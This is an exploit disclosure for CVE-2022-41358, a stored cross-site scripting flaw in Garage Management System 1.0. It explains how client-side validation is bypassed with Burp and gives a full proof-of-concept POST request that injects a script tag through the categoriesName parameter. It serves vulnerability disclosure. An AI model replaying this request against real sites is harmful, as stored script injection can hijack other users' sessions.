## Exploit Title: Garage Management System 1.0 - 'categoriesName' - Stored XSS
## Exploit Author: Sam Wallace
## Software Link: https://www.sourcecodester.com/php/15485/garage-management-system-using-phpmysql-source-code.html
## Version: 1.0
## Tested on: Debian
## ID: CVE-2022-41358

&nbsp;

## Summary:
Garage Management System utilizes client side validation to prevent XSS.
Using burp, a request can be modified and replayed to the server bypassing this validation which creates an avenue for XSS.

&nbsp;

### When messages suggest that validation is occuring this is a good point in time to validate that these checks are also being completed server side. 
![Alt text](/img/client_side_validation.png "Optional title")

&nbsp;

### This is the request prior to any modifications in Burp.
![Alt text](/img/Intercept.png "Optional title")

&nbsp;

### Perform a quick modification in Burp...
![Alt text](/img/Tamper.png "Optional title")

&nbsp;

### Profit!
![Alt text](/img/profit.png "Optional title")

&nbsp;

### Proof
![Alt text](/img/stored_xss.png "Optional title")
#### POC

```
Parameter: categoriesName
URI: /garage/php_action/createCategories.php
```

```POST /garage/php_action/createCategories.php HTTP/1.1
Host: 10.24.0.69
Content-Length: 367
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.24.0.69
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqKDsN4gmatTEEkhS
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.24.0.69/garage/add-category.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=gbklvcv3vvv987636urv0gg53u
Connection: close

------WebKitFormBoundaryqKDsN4gmatTEEkhS
Content-Disposition: form-data; name="categoriesName"

<script>alert(1)</script>
------WebKitFormBoundaryqKDsN4gmatTEEkhS
Content-Disposition: form-data; name="categoriesStatus"

1
------WebKitFormBoundaryqKDsN4gmatTEEkhS
Content-Disposition: form-data; name="create"


------WebKitFormBoundaryqKDsN4gmatTEEkhS--


![Alt text](/img/Intercept.png "Optional title")
```


## Reference:

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41358